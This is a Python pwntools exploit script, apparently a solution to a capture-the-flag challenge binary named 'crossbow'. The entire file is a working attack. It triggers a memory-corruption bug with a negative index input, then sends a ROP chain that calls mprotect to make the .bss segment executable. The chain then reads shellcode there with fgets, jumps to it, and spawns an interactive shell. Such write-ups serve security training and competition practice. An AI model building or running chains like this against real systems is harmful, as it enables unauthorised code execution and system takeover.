#!/usr/bin/env python3

from pwn import *

context.arch = 'amd64'

off = 0x0000000004013EB

if args.GDB:
    io = gdb.debug('./dist/crossbow', '''
        b *0x4013eb
        c
        ''')

else:
    io = process('./dist/crossbow')
    
e = ELF('./dist/crossbow', checksec=False)
rop = ROP(e)

print(f'[*] Gadgets:\n\t \
      pop rdi:    {rop.rdi[0]:#04x}\n\t \
      pop rsi:    {rop.rsi[0]:#04x}\n\t \
      pop rdx:    {rop.rdx[0]:#04x}\n\t \
      bss():      {e.bss():#04x}\n\t \
      fgets:      {e.sym.fgets:#04x}\n\t \
      mprotect:   {e.sym.mprotect:#04x}\n\t \
      STDIN:      {e.sym.__stdin_FILE:#04x}\n \
')

off = 0x200
pl  = b'w3th4nds'
pl += p64(rop.rdi[0])
pl += p64(e.bss())
pl += p64(rop.rsi[0])
pl += p64(0x1000)
pl += p64(rop.rdx[0])
pl += p64(0x7)
pl += p64(e.sym.mprotect)

# fgets
pl += p64(rop.rdi[0])
pl += p64(e.bss(off))
pl += p64(rop.rsi[0])
pl += p64(0x80)
pl += p64(rop.rdx[0])
pl += p64(e.sym.__stdin_FILE)
pl += p64(e.sym.fgets)

# run shellcode
pl += p64(e.bss(off + 1))

_ = io.sendlineafter(b'shoot: ', b'-2')
_ = io.sendafter(b'> ', pl)

_ = io.sendline(asm(shellcraft.sh()))
io.interactive()
